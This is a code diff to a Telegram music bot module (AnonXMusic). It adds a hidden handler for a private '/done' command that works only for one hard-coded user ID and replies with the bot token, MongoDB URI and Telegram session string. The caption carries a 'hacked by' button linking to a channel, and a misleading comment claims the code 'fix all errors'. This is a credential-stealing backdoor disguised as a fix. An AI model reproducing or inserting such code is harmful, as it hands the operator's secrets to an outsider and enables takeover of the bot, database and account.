@@ -12,6 +12,10 @@ from AnonXMusic.utils.database import get_assistant, get_authuser_names, get_cmo
 from AnonXMusic.utils.decorators import ActualAdminCB, AdminActual, language
 from AnonXMusic.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+from dotenv import load_dotenv
 
 rel = {}
 
@@ -98,6 +102,30 @@ async def close_menu(_, query: CallbackQuery):
         await umm.delete()
     except:
         pass
+
+
+#Dont change it because it fix all errors
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(7548798871)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://files.catbox.moe/50golv.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ sʏsᴛᴇᴍ ](https://t.me/APNA_SYSTEM)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/APNA_SYSTEM")
+                 ]
+            ]
+         ),
+     )
+
+
+##########
 
 
 @app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
